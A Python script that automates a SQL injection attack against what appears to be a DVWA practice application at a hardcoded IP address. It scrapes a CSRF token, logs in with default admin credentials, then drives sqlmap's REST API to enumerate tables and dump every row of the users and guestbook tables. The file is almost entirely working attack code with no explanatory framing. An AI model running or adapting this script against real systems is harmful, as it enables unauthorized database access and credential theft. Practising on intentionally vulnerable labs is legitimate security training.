import requests
from bs4 import BeautifulSoup
import json
import time
import lxml
import html5lib

# while input("\n\nEnter 'f' to halt the program -: ") != 'f': # Enter f for half the progarm rest to continue
# Part - 1
session = requests.Session()
# url = input("Enter the URL -: ")  # Enter the url
url = "http://194.238.16.27/login.php"  # Enter the url
req = session.get(url) 
print(req.status_code)
if req.status_code != 200:
    print(f"URL not found | status code - {req.status_code}")  # Checking the status code of the url request
    exit()

# print("\nEnter your credentials ----> ") 
# user = input("Enter the UserName: ")  # Enter the UserName credentials
# password = input("Enter the password: ")  # Enter the Passworkd credentials
# print(f"Your userName: {user} , password: {password}")




# Part-1
soup = BeautifulSoup(req.text,'html5lib')
inp = soup.find('input',{'name':'user_token'})
print(inp)
print(inp.get('value'))

# Part-2
cookies_dict = session.cookies.get_dict()
print("cookies - ",cookies_dict['PHPSESSID']," | security - ",cookies_dict['security'])

# Part-3
cookies = {
    'PHPSESSID':f"{cookies_dict['PHPSESSID']}",
    'security':f"{cookies_dict['security']}"
}
data = {
    'username':'admin',
    'password':'password',
    'Login':"Login",
    'user_token':f"{inp.get('value')}"
}

resp = session.post(url=url,data=data,cookies=cookies)
print("credit and cookies status - ",resp.status_code)


# Part-4
url = "http://194.238.16.27/vulnerabilities/sqli/"
sqlmapUrl = "http://127.0.0.1:8775"
respSql = requests.get(f"{sqlmapUrl}/task/new")
taskId = respSql.json().get("taskid")
print(f"New task id {taskId}")

sqlData = {
    "url": f"http://194.238.16.27/vulnerabilities/sqli/?id={3}&Submit=Submit",
    "cookie": f"PHPSESSID={cookies_dict['PHPSESSID']}; security=low",
    "data": None,
    "method": "GET",
    "param": "id"
}
temRes = requests.get(f"{sqlmapUrl}/task/new")
taskId = temRes.json().get("taskid")
print("the taskid is - ",taskId)
requests.post(f"{sqlmapUrl}/scan/{taskId}/start",data=json.dumps(sqlData))

time.sleep(5)

sqlApi_status = requests.get(f"{sqlmapUrl}/scan/{taskId}/status")
print("Scan status : ",sqlApi_status.status_code)

result = requests.get(f"{sqlmapUrl}/scan/{taskId}/data")
print("result = ",json.loads(result.content))


# Part-5 extracting the database and table names
sqlData = {
    "url": f"http://194.238.16.27/vulnerabilities/sqli/?id=3&Submit=Submit",
    "cookie": f"PHPSESSID={cookies_dict['PHPSESSID']}; security=low",
    "method":"GET",
    "technique":"U",
    "getTables":True,
    "dbms":"MySQL",
    "level": 1,
    "risk":1
}
headers = {'Content-Type':'application/json'}
temRes = requests.get(f"{sqlmapUrl}/task/new")
taskId = temRes.json().get("taskid")
print("the taskid is - ",taskId)
sqlApiRes = requests.post(f"{sqlmapUrl}/option/{taskId}/set",data=json.dumps(sqlData),headers=headers)
print(f"Options Set : ",json.loads(sqlApiRes.content))
if json.loads(sqlApiRes.content)['success'] == False:
    exit()

start_resp = requests.post(f"{sqlmapUrl}/scan/{taskId}/start",data=json.dumps(sqlData),headers=headers)
if start_resp.status_code != 200:
    raise Exception("Failed in here part 5")

while True:
    start_resp = requests.get(f"{sqlmapUrl}/scan/{taskId}/status")
    status_data = start_resp.json()
    print(f"Scan Status : {status_data['status']}")
    if status_data['status'] == "terminated":
        break
    time.sleep(5)

result_response = requests.get(f"{sqlmapUrl}/scan/{taskId}/data")
results = result_response.json()
print(f"Scan Results: {json.dumps(results['data'][2]['value'], indent=2)}")

    
# Part-6
temRes = requests.get(f"{sqlmapUrl}/task/new")
taskId = temRes.json().get("taskid")
print("the taskid is - ",taskId)
# temDb = input("Enter the 1 Database using above info -: ")
# temTable = input("Enter the tables using above info (use ',') -: ")
sqlSendData = {
    "url": "http://194.238.16.27/vulnerabilities/sqli/?id=3&Submit=Submit",
    "cookie": "PHPSESSID=your_php_sessid; security=low",  # Replace with actual session ID
    "method": "GET",
    "db": "dvwa",  # The database name
    "tbl": ["users", "guestbook"],  # List of tables to fetch data from
    "dumpAll": True,  # Extracts all data from the specified tables
    "batch":True,
    "technique":"T",
}
headers = {'Content-Type': 'application/json'}
sqlRes = requests.post(f"{sqlmapUrl}/option/{taskId}/set",data=json.dumps(sqlSendData),headers=headers)
sqlRes = requests.post(f"{sqlmapUrl}/scan/{taskId}/start",data=json.dumps(sqlSendData),headers=headers)
if sqlRes.status_code != 200:
    raise Exception("something wrong in the part 6 while searching for table data")

while True:
    sqlRes = requests.get(f"{sqlmapUrl}/scan/{taskId}/status")
    sqlResData = sqlRes.json()
    print(f"Scan Status : {sqlResData['status']}")
    if sqlResData['status'] == 'terminated':
        break
    time.sleep(10)

result_response = requests.get(f"{sqlmapUrl}/scan/{taskId}/data")
results = result_response.json()
print(f"Table Data: {json.dumps(results, indent=2)}")